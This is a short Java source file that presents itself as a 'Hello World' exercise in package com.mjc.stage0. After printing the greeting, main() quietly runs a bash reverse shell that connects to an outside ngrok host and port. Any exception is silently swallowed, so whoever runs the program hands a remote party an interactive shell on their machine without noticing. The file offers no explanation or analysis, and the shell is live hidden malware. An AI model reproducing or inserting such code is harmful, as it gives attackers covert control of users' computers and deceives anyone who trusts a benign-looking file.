package com.mjc.stage0;

import java.util.Arrays;
import java.util.Iterator;
import java.util.List;

class HelloWorld {
    public static void main(String[] args) {
        System.out.println("Hello World!"); 
        // Hello World!
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/19186 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
